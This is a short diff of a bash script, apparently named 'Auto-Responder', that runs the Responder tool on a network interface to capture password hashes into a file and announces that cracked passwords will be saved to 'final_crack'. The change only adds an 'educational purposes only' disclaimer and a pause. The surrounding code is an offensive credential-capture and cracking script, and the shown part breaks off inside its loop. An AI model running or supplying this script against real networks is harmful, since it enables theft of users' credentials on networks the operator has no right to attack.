@@ -1,5 +1,8 @@
 #!/bin/bash
 unbuffer responder -I eth0 -dw -v >>  hash &
+echo "Auto-Responder is meant for educational purposes only. Please use it responsibly."
+echo 
+sleep 4
 echo "cracked passwords will be saved to (final_crack)"
 while true ;do
 sleep 4
